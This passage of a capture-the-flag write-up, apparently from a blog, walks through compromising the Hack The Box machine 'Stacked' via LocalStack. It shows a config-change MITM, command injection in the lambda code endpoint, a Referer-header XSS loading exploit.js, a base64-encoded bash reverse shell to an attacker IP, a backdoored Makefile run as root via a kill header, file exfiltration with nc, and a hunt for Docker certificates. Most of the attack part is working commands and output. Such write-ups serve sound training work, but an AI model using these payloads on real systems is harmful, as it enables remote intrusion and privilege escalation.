<span class="mtk7">fetch</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://127.0.0.1:4566/?_config_</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">{</span>
  <span class="mtk1">body</span><span class="mtk1">:</span> <span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">({</span>
    <span class="mtk1">variable</span><span class="mtk1">:</span> <span class="mtk4">'FORWARD_EDGE_INMEM'</span><span class="mtk1">,</span>
    <span class="mtk1">value</span><span class="mtk1">:</span> <span class="mtk6">false</span>
  <span class="mtk1">}),</span>
  <span class="mtk1">headers</span><span class="mtk1">:</span> <span class="mtk1">{</span> <span class="mtk4">'Content-Type'</span><span class="mtk1">:</span> <span class="mtk4">'application/json'</span> <span class="mtk1">},</span>  
  <span class="mtk1">method</span><span class="mtk1">:</span> <span class="mtk4">'post'</span>
<span class="mtk1">})</span>
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">text</span><span class="mtk1">())</span>
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">)</span>

<span class="mtk7">fetch</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://127.0.0.1:4566/?_config_</span><span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">{</span>
  <span class="mtk1">body</span><span class="mtk1">:</span> <span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">({</span>
    <span class="mtk1">variable</span><span class="mtk1">:</span> <span class="mtk4">'HOSTNAME'</span><span class="mtk1">,</span>
    <span class="mtk1">value</span><span class="mtk1">:</span> <span class="mtk4">'172.16.33.1'</span>
  <span class="mtk1">}),</span>
  <span class="mtk1">headers</span><span class="mtk1">:</span> <span class="mtk1">{</span> <span class="mtk4">'Content-Type'</span><span class="mtk1">:</span> <span class="mtk4">'application/json'</span> <span class="mtk1">},</span>
  <span class="mtk1">method</span><span class="mtk1">:</span> <span class="mtk4">'post'</span><span class="mtk1">,</span>
<span class="mtk1">})</span>
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk9 mtki">res</span> <span class="mtk7 mtki">=&gt;</span> <span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">text</span><span class="mtk1">())</span>
  <span class="mtk1">.</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">)</span>
</code></pre></div><p>And we see that LocalStack responds:</p><p><img alt="LocalStack MITM proxy" src="/images/HTB/Stacked/Stacked-localstack-mitm-proxy.webp"></p><p>Moreover, the variables are shown in the log:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-cyan">localstack_main  |</span> INFO:localstack.services.infra: Updating value of config variable "HOSTNAME": 172.16.33.1
<span class="code-dark-cyan">localstack_main  |</span> INFO:localstack.services.infra: Updating value of config variable "FORWARD_EDGE_INMEM": False  
</code></pre></div><p>Now we have configured LocalStack so that every request comes to our controlled IP address. We can verify it using <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4566
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4566
Ncat: Listening on 0.0.0.0:4566
Ncat: Connection from 172.16.33.1.
Ncat: Connection from 172.16.33.1:56875.
GET /shell/ HTTP/1.1
Remote-Addr: 172.17.0.1
Host: localhost:4566
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Thu, 28 May 2020 17:39:06 GMT
Cache-Control: max-age=0
X-Forwarded-For: 172.17.0.1, localhost:4566
x-localstack-edge: https://localhost:4566
Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234  
</code></pre></div><p>And if we go to <code>http://localhost:4566/shell/</code> (legitimate website), we see nothing:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> http://localhost:4566/shell/  
{}
</code></pre></div><p>Now we control the responses. We can build a simple Python HTTP server using Flask:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>

<span class="mtk5">from</span> <span class="mtk8 mtku">flask</span> <span class="mtk5">import</span> <span class="mtk8 mtku">Flask</span><span class="mtk1">,</span> <span class="mtk1">request</span>

<span class="mtk1">app</span> <span class="mtk5">=</span> <span class="mtk8 mtku">Flask</span><span class="mtk1">(</span><span class="mtk1">__name__</span><span class="mtk1">)</span>


<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/shell/'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span> <span class="mtk8">shell</span><span class="mtk1">():</span>
    <span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">headers</span><span class="mtk1">)</span>
    <span class="mtk5">return</span> <span class="mtk4">'Hacked!!'</span>


<span class="mtk5">if</span> <span class="mtk1">__name__</span> <span class="mtk5">==</span> <span class="mtk4">'__main__'</span><span class="mtk1">:</span>
    <span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">host</span><span class="mtk5">=</span><span class="mtk4">'172.16.33.1'</span><span class="mtk1">,</span> <span class="mtk9 mtki">port</span><span class="mtk5">=</span><span class="mtk6">4566</span><span class="mtk1">)</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> app.py
 * Serving Flask app 'app' (lazy loading)
 * Environment: production
   <span class="code-dark-red">WARNING: This is a development server. Do not use it in a production deployment.</span>
   <span class="code-dark-grey">Use a production WSGI server instead.</span>
 * Debug mode: off
 * Running on http://172.16.33.1:4566/ (Press CTRL+C to quit)
Remote-Addr: 172.17.0.1
Host: localhost:4566
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0
X-Forwarded-For: 172.17.0.1, localhost:4566
X-Localstack-Edge: https://localhost:4566
Authorization: AWS4-HMAC-SHA256 Credential=__internal_call__/20160623/us-east-1/dynamodb/aws4_request, SignedHeaders=content-type;host;x-amz-date;x-amz-target, Signature=1234  


172.16.33.1 - - [] "GET /shell/ HTTP/1.1" 200 -
</code></pre></div><p><img alt="LocalStack MITM proxy hacked" src="/images/HTB/Stacked/Stacked-localstack-mitm-proxy-hacked.webp"></p><p>With this, we have full control over requests and responses from LocalStack.</p><h2 id="compromising-localstack-rce">Compromising LocalStack. RCE</h2><p>There is also an attack vector that can lead to Remote Code Execution (RCE) on the container when going to <code>/lambda/&lt;functionName>/code</code> (parameter <code>functionName</code> is has a command injection vulnerability) using a POST request (also show-cased in <a target="_blank" href="https://blog.sonarsource.com/hack-the-stack-with-localstack">SonarSource</a>).</p><p>To test it, I will restart the Docker container and use this request:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'127.0.0.1:8080/lambda/;curl%20172.16.33.1/code'</span> -d <span class="code-dark-yellow">'{"awsEnvironment":""}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;500 Internal Server Error&lt;/title&gt;
&lt;h1&gt;Internal Server Error&lt;/h1&gt;
&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;  
</code></pre></div><p>And we receive a hit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 172.16.33.1.
Ncat: Connection from 172.16.33.1:50609.
GET / HTTP/1.1
Host: 172.16.33.1
User-Agent: curl/7.67.0
Accept: */*
</code></pre></div><p>Hence, we could even get a reverse shell on the container.</p><h2 id="finding-xss">Finding XSS</h2><p>We can assume that the machine has a LocalStack environment running, so we can reproduce the attack vector shown in the blog and use XSS to exploit the command injection vulnerability and gain access to the container (MITM proxy exploit is not needed).</p><p>First of all we need to find some user input. The only one is a contact form in <code>http://portfolio.stacked.htb</code>:</p><p><img alt="Stacked contact" src="/images/HTB/Stacked/Stacked-contact.webp"></p><p>If we try a simple XSS payload, it gets blocked:</p><p><img alt="Stacked contact XSS" src="/images/HTB/Stacked/Stacked-contact-xss.webp"></p><p>We can use Burp Suite (Repeater) to test more payloads. I will keep <code>nc</code> listening on port 80 to see if some payload gets executed.</p><p><img alt="Burp Repeater" src="/images/HTB/Stacked/Stacked-burp.webp"></p><p>After a lot of attempts, we find out that the <code>Referer</code> header is injectable:</p><p><img alt="Burp Referer" src="/images/HTB/Stacked/Stacked-burp-referer.webp"></p><p>And we receive a request in <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:35146.
GET / HTTP/1.1
Host: 10.10.17.44
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://mail.stacked.htb/read-mail.php?id=2
Connection: keep-alive
Upgrade-Insecure-Requests: 1
</code></pre></div><p>Although we see another subdomain called <code>mail.stacked.htb</code>, we cannot access it. The server redirects:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -I mail.stacked.htb
HTTP/1.1 302 Found
<span class="code-white">Date</span>:
<span class="code-white">Server</span>: Apache/2.4.41 (Ubuntu)
<span class="code-white">Location</span>: http://stacked.htb/
<span class="code-white">Content-Type</span>: text/html; charset=iso-8859-1  
</code></pre></div><p>Moreover, <code>mail</code> is a common subdomain and <code>ffuf</code> didn&rsquo;t find it.</p><h2 id="foothold-on-the-container">Foothold on the container</h2><p>Hence, we will exploit the command injection vulnerability in <code>/lambda/&lt;functionName>/code</code> to get a reverse shell on the container. The reverse shell payload is this one encoded in Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p>Now we create this JavaScript file (<code>exploit.js</code>) that performs a POST request as shown previously on the local exploitation:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span> <span class="mtk1">cmd</span> <span class="mtk5">=</span> <span class="mtk4">'echo</span> <span class="mtk4">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NC</span><span class="mtk4">AwPiYx</span> <span class="mtk4">|</span> <span class="mtk4">base64</span> <span class="mtk4">-d</span> <span class="mtk4">|</span> <span class="mtk4">bash'</span>  

<span class="mtk7">fetch</span><span class="mtk1">(</span><span class="mtk4">`</span><span class="mtk4 detected-link">http://127.0.0.1:8080/lambda/;</span><span class="mtk5 detected-link">${</span><span class="mtk7 detected-link">encodeURIComponent</span><span class="mtk1 detected-link">(</span><span class="mtk1 detected-link">cmd</span><span class="mtk1 detected-link">)</span><span class="mtk5 detected-link">}</span><span class="mtk4 detected-link">/code</span><span class="mtk4">`</span><span class="mtk1">,</span> <span class="mtk1">{</span>
  <span class="mtk1">body</span><span class="mtk1">:</span> <span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">({</span> <span class="mtk1">awsEnvironment</span><span class="mtk1">:</span> <span class="mtk4">''</span> <span class="mtk1">}),</span>
  <span class="mtk1">headers</span><span class="mtk1">:</span> <span class="mtk1">{</span> <span class="mtk4">'Content-Type'</span><span class="mtk1">:</span> <span class="mtk4">'application/json'</span> <span class="mtk1">},</span>
  <span class="mtk1">method</span><span class="mtk1">:</span> <span class="mtk4">'post'</span>
<span class="mtk1">})</span>
</code></pre></div><p>Now we can start a Python HTTP server and submit the contact form injecting our XSS payload on the <code>Referer</code> header to load our malicious JavaScript file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> portfolio.stacked.htb/process.php -H <span class="code-dark-yellow">'Referer: &lt;script src="http://10.10.17.44/exploit.js"&gt;&lt;/script&gt;'</span> -d <span class="code-dark-yellow">'tel=1&fullname=&email=&subject=&message='</span>  
{"success":"Your form has been submitted. Thank you!"}
</code></pre></div><p>The victim&rsquo;s browser requests the file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.112 - - [] "GET /exploit.js HTTP/1.1" 200 -  
</code></pre></div><p>And we receive the reverse shell connection:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:32822.
bash: cannot set terminal process group (20): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
bash-5.0$ python3 -c 'import pty; pty.spawn("/bin/bash")'  
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: /root/.bashrc: Permission denied
bash-5.0$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
bash-5.0$ export TERM=xterm
bash-5.0$ export SHELL=bash
bash-5.0$ stty rows 50 columns 158
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>The first thing we notice is that we are not <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ whoami  
localstack
</code></pre></div><p>Let&rsquo;s see if there is a shared volume mount with the host machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ df -h
Filesystem                Size      Used Available Use% Mounted on
overlay                   7.3G      6.5G    691.7M  91% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                     1.9G         0      1.9G   0% /sys/fs/cgroup
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /tmp/localstack
df: /root/.docker: Permission denied
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /etc/resolv.conf
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /etc/hostname
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /etc/hosts
shm                      64.0M         0     64.0M   0% /dev/shm
/dev/mapper/ubuntu--vg-ubuntu--lv
                          7.3G      6.5G    691.7M  91% /home/localstack/user.txt  
tmpfs                     1.9G         0      1.9G   0% /proc/acpi
tmpfs                    64.0M         0     64.0M   0% /proc/kcore
tmpfs                    64.0M         0     64.0M   0% /proc/keys
tmpfs                    64.0M         0     64.0M   0% /proc/timer_list
tmpfs                    64.0M         0     64.0M   0% /proc/sched_debug
tmpfs                     1.9G         0      1.9G   0% /proc/scsi
tmpfs                     1.9G         0      1.9G   0% /sys/firmware
</code></pre></div><p>Well, we have some mounts (<code>/tmp/localstack</code> into <code>/root/.docker</code> and <code>/home/localstack/user.txt</code>). At this point, we have the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ cat /home/localstack/user.txt  
c877918fc5f7cb38e0631f7849c20b1b
</code></pre></div><p>If we look again at the <code>docker-compose.yml</code>, we find that <code>/tmp/localstack</code> is used as a volume mount. This directory is used to store the client certificates. These files will be useful to connect to Docker on port 2376, so we must escalate to <code>root</code> inside the container.</p><h2 id="privilege-escalation-in-the-container">Privilege escalation in the container</h2><p>Let&rsquo;s enumerate running processes executed by <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ ps -a | grep root
    1 root      0:00 {docker-entrypoi} /bin/bash /usr/local/bin/docker-entrypoint.sh
   14 root      0:15 {supervisord} /usr/bin/python3.8 /usr/bin/supervisord -c /etc/supervisord.conf
   17 root      0:05 tail -qF /tmp/localstack_infra.log /tmp/localstack_infra.err
   21 root      0:00 make infra
   24 root      1:19 python bin/localstack start --host
   95 root      2:22 java -Djava.library.path=./DynamoDBLocal_lib -Xmx256m -jar DynamoDBLocal.jar -port 44759 -dbPath /var/localstack/data/dynamodb
  107 root      0:00 node /opt/code/localstack/localstack/node_modules/kinesalite/cli.js --shardLimit 100 --port 44677 --createStreamMs 500 --deleteStreamMs 500 --updateStreamMs 500 --path /var/localstack/data/kinesis  
159289 localsta  0:00 grep root
</code></pre></div><p>There is a <code>make infra</code> command, which executes a list of commands inside a file called <code>Makefile</code>. These are all the files called <code>Makefile</code> in the container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ find / -name Makefile 2&gt;/dev/null
/usr/local/lib/node_modules/npm/node_modules/columnify/Makefile
/usr/local/lib/node_modules/npm/node_modules/json-stringify-safe/Makefile
/usr/local/lib/node_modules/npm/node_modules/extsprintf/Makefile
/usr/local/lib/node_modules/npm/node_modules/retry/Makefile
/usr/local/lib/node_modules/npm/node_modules/delayed-stream/Makefile
/usr/local/lib/node_modules/npm/node_modules/delegates/Makefile
/usr/local/lib/node_modules/npm/node_modules/isarray/Makefile
/usr/local/lib/node_modules/npm/Makefile
/usr/share/groff/1.22.4/font/devlj4/generate/Makefile
/usr/share/groff/1.22.4/font/devps/generate/Makefile
/usr/share/groff/1.22.4/font/devdvi/generate/Makefile
/usr/lib/python3.8/config-3.8-x86_64-linux-gnu/Makefile
/opt/code/localstack/localstack/node_modules/leveldown/deps/leveldb/leveldb-1.20/Makefile  
/opt/code/localstack/localstack/dashboard/web/node_modules/debug/Makefile
/opt/code/localstack/localstack/dashboard/web/node_modules/delayed-stream/Makefile
/opt/code/localstack/localstack/dashboard/web/node_modules/superagent/Makefile
/opt/code/localstack/localstack/dashboard/web/node_modules/isarray/Makefile
/opt/code/localstack/Makefile
</code></pre></div><p>The last one seems more interesting, and indeed we have permissions to modify the file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ ls -l /opt/code/localstack/Makefile
-rw-rw-r--    1 localsta localsta      8455 Feb  1  2021 /opt/code/localstack/Makefile  
</code></pre></div><p>So we can place a command that executes a reverse shell. But we need to figure out how we will tell <code>root</code> to run <code>make infra</code>, because this type of command is usually run once at the beginning.</p><p>Looking at the <a target="_blank" href="https://github.com/localstack/localstack">LocalStack GitHub project</a> using GitHub Codespaces, we can search for <code>restart</code>:</p><p><img alt="Infra restart" src="/images/HTB/Stacked/Stacked-infra-restart.webp"></p><p>And we see that there is a way to actually kill the process even if we are not <code>root</code>. Now we can search for <code>kill</code> and find a way to tell LocalStack to restart <code>infra</code> as <code>root</code>:</p><p><img alt="Infra kill" src="/images/HTB/Stacked/Stacked-infra-kill.webp"></p><p>We only need to insert a header called <code>x-localstack-kill</code>. Thus, we will modify the <code>Makefile</code> to add a reverse shell payload and restart the service while listening with <code>nc</code>.</p><p>First, we take the file:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ nc 10.10.17.44 4444 &lt; /opt/code/localstack/Makefile  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444 &gt; Makefile_orig
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:40781.

<span class="code-cyan">$</span> <span class="code-dark-green">cp</span> Makefile_orig Makefile_pwn
</code></pre></div><p>And now we change it. This is the modified <code>Makefile</code> (called <code>Makefile_pwn</code> locally):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#</span> <span class="mtk3">...</span>

<span class="mtk8">infra</span><span class="mtk1">:</span>             <span class="mtk3">##</span> <span class="mtk3">Manually</span> <span class="mtk3">start</span> <span class="mtk3">the</span> <span class="mtk3">local</span> <span class="mtk3">infrastructure</span> <span class="mtk3">for</span> <span class="mtk3">testing</span>
  <span class="mtk1">echo</span> <span class="mtk1">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NC</span><span class="mtk1">AwPiYx</span> <span class="mtk1">|</span> <span class="mtk1">base64</span> <span class="mtk1">-d</span> <span class="mtk1">|</span> <span class="mtk1">bash</span>  
  <span class="mtk1">(</span><span class="mtk4">$(</span><span class="mtk1">VENV_RUN</span><span class="mtk4">)</span><span class="mtk1">;</span> <span class="mtk1">exec</span> <span class="mtk1">bin/localstack</span> <span class="mtk1">start</span> <span class="mtk1">--host)</span>

<span class="mtk3">#</span> <span class="mtk3">...</span>
</code></pre></div><p>Finally, we overwrite the existing one:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ curl 10.10.17.44/Makefile_pwn -so /opt/code/localstack/Makefile  
</code></pre></div><p>Now it is time to restart the service and get access as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0$ curl 127.0.0.1:4566 -H 'x-localstack-kill: asdf'  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.112.
Ncat: Connection from 10.10.11.112:56628.
bash: cannot set terminal process group (159315): Not a tty  
bash: no job control in this shell
bash-5.0# python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-5.0# ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
bash-5.0# export TERM=xterm
bash-5.0# export SHELL=bash
bash-5.0# stty rows 50 columns 158
</code></pre></div><h2 id="privilege-escalation-on-the-machine">Privilege escalation on the machine</h2><p>Nice, we are <code>root</code> in the container. Now we can search for the required certificates to interact with Docker exposed on port 2376:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# find / -name \*.pem\* 2&gt;/dev/null | grep -v etc
/tmp/localstack/server.test.pem.key
/tmp/localstack/server.test.pem.crt
/tmp/localstack/server.test.pem
/tmp/tmpiwxfx4eh.pem
/tmp/tmpiwxfx4eh.pem.crt
/tmp/tmpiwxfx4eh.pem.key
/usr/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem
/usr/lib/python3.8/site-packages/certifi/cacert.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-key.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-crt.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-key.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/ca-crt.pem
/opt/code/localstack/localstack/node_modules/kinesalite/ssl/server-csr.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.passwd.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/dh512.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert2.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/keycert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badcert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/https_svn_python_org_root.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_cert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullbytecert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/badkey.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nokia.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.passwd.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/nullcert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/sha256.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/future/backports/test/ssl_key.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/websocket/cacert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/pyftpdlib/test/keycert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/pip/_vendor/certifi/cacert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/certifi/cacert.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_x509.pem
